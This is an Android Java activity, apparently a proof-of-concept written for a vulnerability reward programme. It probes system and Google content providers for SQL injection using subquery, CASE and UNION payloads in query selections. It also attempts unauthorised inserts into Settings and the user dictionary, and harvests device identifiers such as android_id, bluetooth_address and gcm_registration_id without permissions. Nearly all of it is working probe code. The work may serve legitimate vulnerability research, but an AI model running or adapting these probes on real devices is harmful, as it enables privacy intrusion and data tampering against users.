package com.vrp.poc;

import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.LinearLayout;
import android.widget.TextView;

public class SettingsSqliActivity extends Activity {
    private static final String TAG = "SettingsSQLi";
    private TextView logView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(20, 20, 20, 20);
        logView = new TextView(this);
        logView.setTextSize(8);
        logView.setText("Settings Provider SQLi + Zero-Perm Tests\nUID: " + android.os.Process.myUid() + "\n\n");
        ll.addView(logView);
        sv.addView(ll);
        setContentView(sv);
        new Thread(this::runTests).start();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        runOnUiThread(() -> logView.append(msg + "\n"));
    }

    private int queryCount(Uri uri, String selection) {
        try {
            Cursor c = getContentResolver().query(uri, new String[]{"_id"}, selection, null, null);
            if (c != null) {
                int count = c.getCount();
                c.close();
                return count;
            }
        } catch (Exception e) {
            return -1;
        }
        return -1;
    }

    private void runTests() {
        // Test 1: Settings provider SQLi
        log("=== Test 1: Settings SQLi ===");
        for (String table : new String[]{"system", "secure", "global"}) {
            Uri uri = Uri.parse("content://settings/" + table);
            int normal = queryCount(uri, null);
            log(table + " normal: " + normal);

            // Subquery test
            int sqliTrue = queryCount(uri, "(SELECT 1) = 1");
            int sqliFalse = queryCount(uri, "(SELECT 1) = 99");
            log(table + " subquery: true=" + sqliTrue + " false=" + sqliFalse);
            if (sqliTrue > 0 && sqliFalse == 0) {
                log("  [VULN] " + table + " SQLi confirmed!");
            }

            // CASE test
            int caseTrue = queryCount(uri, "CASE WHEN 1=1 THEN 1 ELSE 0 END = 1");
            int caseFalse = queryCount(uri, "CASE WHEN 1=0 THEN 1 ELSE 0 END = 1");
            log(table + " CASE: true=" + caseTrue + " false=" + caseFalse);
            if (caseTrue > 0 && caseFalse == 0) {
                log("  [VULN] " + table + " CASE injection confirmed!");
            }

            // UNION test
            int unionTest = queryCount(uri, "1=0) UNION SELECT 1,2,3,4 FROM sqlite_master--");
            log(table + " UNION: " + unionTest);

            // Test write to settings
            try {
                android.content.ContentValues cv = new android.content.ContentValues();
                cv.put("name", "vrp_test_key");
                cv.put("value", "vrp_test_value");
                Uri result = getContentResolver().insert(uri, cv);
                if (result != null) {
                    log("[WRITE VULN] " + table + " insert: " + result);
                    // Try to read it back
                    String val = Settings.System.getString(getContentResolver(), "vrp_test_key");
                    log("  Read back: " + val);
                    // Cleanup
                    getContentResolver().delete(uri, "name='vrp_test_key'", null);
                }
            } catch (Exception e) {
                log(table + " write: " + e.getClass().getSimpleName());
            }
        }

        // Test 2: Sensitive settings readable without permissions
        log("\n=== Test 2: Sensitive Settings (zero perm) ===");
        String[] sensitiveKeys = {
            "android_id",
            "bluetooth_address",
            "bluetooth_name",
            "device_name",
            "enabled_notification_listeners",
            "enabled_accessibility_services",
            "enabled_input_methods",
            "default_input_method",
            "lock_screen_allow_private_notifications",
            "install_non_market_apps",
            "adb_enabled",
            "development_settings_enabled",
            "usb_mass_storage_enabled",
        };
        for (String key : sensitiveKeys) {
            try {
                String val = Settings.Secure.getString(getContentResolver(), key);
                if (val != null && val.length() > 80) val = val.substring(0, 80) + "...";
                if (val != null) log("[READABLE] Secure/" + key + " = " + val);
            } catch (Exception e) {
                // try global
                try {
                    String val = Settings.Global.getString(getContentResolver(), key);
                    if (val != null) log("[READABLE] Global/" + key + " = " + val);
                } catch (Exception e2) {}
            }
        }

        // Test 3: Google Services Framework
        log("\n=== Test 3: GSF/GServices ===");
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://com.google.android.gsf.gservices"),
                null, null, null, null);
            if (c != null) {
                log("[OPEN] GServices: " + c.getCount() + " rows");
                c.close();
            }
        } catch (Exception e) {
            log("GServices: " + e.getClass().getSimpleName());
        }

        // Try specific GServices keys
        String[] gsfKeys = {
            "android_id",
            "checkin_device_id",
            "gcm_registration_id",
        };
        for (String key : gsfKeys) {
            try {
                Cursor c = getContentResolver().query(
                    Uri.parse("content://com.google.android.gsf.gservices"),
                    null, null, new String[]{key}, null);
                if (c != null && c.moveToFirst()) {
                    log("GSF/" + key + " = " + c.getString(1));
                    c.close();
                }
            } catch (Exception e) {
                log("GSF/" + key + ": " + e.getClass().getSimpleName());
            }
        }

        // Test 4: PendingIntent leak via notification listener
        log("\n=== Test 4: Notification service check ===");
        // Check if we can register as notification listener without permission
        String enabledListeners = Settings.Secure.getString(getContentResolver(),
            "enabled_notification_listeners");
        log("Notification listeners: " + (enabledListeners != null ? enabledListeners.length() + " chars" : "null"));

        // Test 5: Try to access content from GMS without auth
        log("\n=== Test 5: GMS providers (no auth) ===");
        String[][] gmsProviders = {
            {"content://com.google.android.gms.phenotype/com.google.android.gms.auth", "phenotype_auth"},
            {"content://com.google.android.gms.phenotype/com.google.android.gms.people", "phenotype_people"},
            {"content://com.google.android.gms.phenotype/com.google.android.gms.cast", "phenotype_cast"},
            {"content://com.google.android.gms.phenotype/com.google.android.dialer", "phenotype_dialer"},
            {"content://com.google.android.gms.phenotype/com.google.android.apps.messaging", "phenotype_msg"},
            {"content://com.google.android.gms.chimera/com.google.android.gms", "chimera_gms"},
        };
        for (String[] p : gmsProviders) {
            try {
                Cursor c = getContentResolver().query(Uri.parse(p[0]), null, null, null, null);
                if (c != null) {
                    log("[OPEN] " + p[1] + ": " + c.getCount() + " rows");
                    if (c.getCount() > 0 && c.moveToFirst()) {
                        for (int i = 0; i < Math.min(c.getColumnCount(), 5); i++) {
                            String val = c.getString(i);
                            if (val != null && val.length() > 50) val = val.substring(0, 50) + "...";
                            log("  " + c.getColumnName(i) + " = " + val);
                        }
                    }
                    c.close();
                } else {
                    log("[NULL] " + p[1]);
                }
            } catch (Exception e) {
                log("[ERR] " + p[1] + ": " + e.getClass().getSimpleName());
            }
        }

        // Test 6: UserDictionary SQLi
        log("\n=== Test 6: UserDictionary SQLi ===");
        Uri udUri = Uri.parse("content://user_dictionary/words");
        int udNormal = queryCount(udUri, null);
        log("UserDict normal: " + udNormal);
        // Try write
        try {
            android.content.ContentValues cv = new android.content.ContentValues();
            cv.put("word", "vrp_test_word");
            cv.put("frequency", 250);
            cv.put("locale", "en_US");
            Uri result = getContentResolver().insert(udUri, cv);
            if (result != null) {
                log("[WRITE VULN] UserDict insert: " + result);
                // Read it back
                Cursor c = getContentResolver().query(udUri, null,
                    "word='vrp_test_word'", null, null);
                if (c != null) {
                    log("  Read back: " + c.getCount() + " rows");
                    c.close();
                }
                // Cleanup
                getContentResolver().delete(result, null, null);
            }
        } catch (Exception e) {
            log("UserDict write: " + e.getClass().getSimpleName());
        }

        log("\n=== ALL TESTS COMPLETE ===");
    }
}
